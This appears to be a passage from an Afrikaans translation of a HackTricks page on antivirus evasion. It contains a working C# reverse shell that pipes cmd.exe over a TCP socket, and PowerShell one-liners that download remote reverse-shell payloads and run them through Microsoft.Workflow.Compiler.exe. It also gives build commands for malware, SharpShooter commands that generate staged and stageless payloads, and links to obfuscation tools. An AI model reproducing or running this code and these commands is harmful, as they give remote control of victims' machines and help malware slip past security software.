using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# deur die gebruik van 'n kompilator

Hierdie tegniek maak gebruik van 'n C# kompilator om 'n skadelike kode te skep wat die antivirus (AV) kan omseil. Die idee is om 'n skadelike funksie te skryf wat die AV nie kan opspoor nie, en dit dan te kompilieer na 'n uitvoerbare lêer wat nie as skadelik geïdentifiseer word nie.

#### Stappe:

1. Skryf die skadelike funksie in C#.
2. Kompileer die funksie na 'n uitvoerbare lêer.
3. Voer die uitvoerbare lêer uit op die teikenstelsel.

#### Voordele:

- Hierdie tegniek kan effektief wees omdat die AV dikwels nie die bronkode van die uitvoerbare lêer kan ontleed nie.
- Dit kan ook help om te omseil dat die AV die skadelike funksie opspoor deur die kode te vermom as 'n legitieme toepassing.

#### Nadele:

- Dit vereis kennis van C# en die gebruik van 'n kompilator.
- Dit kan nie altyd suksesvol wees nie, aangesien AV-opdaterings die skadelike funksie kan opspoor en blokkeer.

#### Voorbeeld:

```csharp
using System;

class Program
{
    static void Main()
    {
        // Skadelike funksie
        Console.WriteLine("Hierdie is 'n skadelike funksie!");
    }
}
```

In hierdie voorbeeld sal die skadelike funksie eenvoudig 'n boodskap na die konsole uitvoer. Die funksie kan dan gekompileer word na 'n uitvoerbare lêer en uitgevoer word op die teikenstelsel sonder dat die AV dit opspoor.
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Outomatiese aflaai en uitvoering:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

C# obfuscators lys: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
* [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
* [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
* [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
* [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
* [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Ander gereedskap
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Meer

* [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hack-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repositorium.

</details>
